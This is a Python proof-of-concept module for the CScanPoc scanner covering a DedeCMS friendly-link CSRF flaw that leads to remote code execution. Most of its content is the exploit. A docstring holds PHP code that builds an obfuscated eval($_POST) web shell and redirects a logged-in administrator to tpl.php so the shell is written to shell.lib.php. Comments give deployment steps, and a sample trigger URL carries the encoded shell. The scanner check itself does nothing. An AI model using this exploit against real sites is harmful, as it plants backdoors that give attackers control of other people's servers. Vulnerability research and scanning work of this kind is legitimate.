# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0014_L'  # 平台漏洞编号，留空
    name = '织梦CMS 友情链接getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-01-02'  # 漏洞公布时间
    desc = '''
        织梦CMS在 tpl.php 中 userLogin类用户登录，
        没有对管理员的来源页进行任何检查，只是检查了管理员是否登陆，这就造成了一个CSRF漏洞。
        到这里漏洞思路就很清晰了，由于变量可控漏洞导致可写入任意代码，由于CSRF漏洞诱导管理员以管理员的权限去写入代码。
    '''  # 漏洞描述
    ref = 'https://www.sitedirsec.com/exploit-1899.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cbd953f8-ea65-42e9-9b2e-efbb3742fc72'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # exp
            """
            <?php
            //print_r($_SERVER);
            $referer = $_SERVER[''HTTP_REFERER''];
            $dede_login = str_replace("friendlink_main.php","",$referer);//去掉friendlink_main.php，取得dede后台的路径
            //拼接 exp
            $muma = ''<''.''?''.''@''.''e''.''v''.''a''.''l''.''(''.''$''.''_''.''P''.''O''.''S''.''T''.''[''.''\''''.''c''.''\''''.'']''.'')''.'';''.''?''.''>'';
            $exp = ''tpl.php?action=savetagfile&actiondo=addnewtag&content=''. $muma .''&filename=shell.lib.php'';
            $url = $dede_login.$exp;
            //echo $url;
            header("location: ".$url);
            // send mail coder
            exit();
            ?>
            """

            # 首先，将这个exp部署在你的服务器上，当然你必须要有一个公网ip，假设你的url为：http://www.xxxx.com/exp.php`在目标网站的申请友情链接处申请一个友情链接
            # 当点这个友情链接的时候，就生成了一句话shell，shell地址在//include/taglib/shell.lib.php

            # 管理员触发了一个链接
            # http://127.0.0.1/DedeCMS-V5.7-UTF8-SP1-Full/uploads/dede/tpl.php?action=savetagfile&actiondo=addnewtag&content=%3C?@eval($_POST[%27c%27]);?%3E&filename=shell.lib.php

            #self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
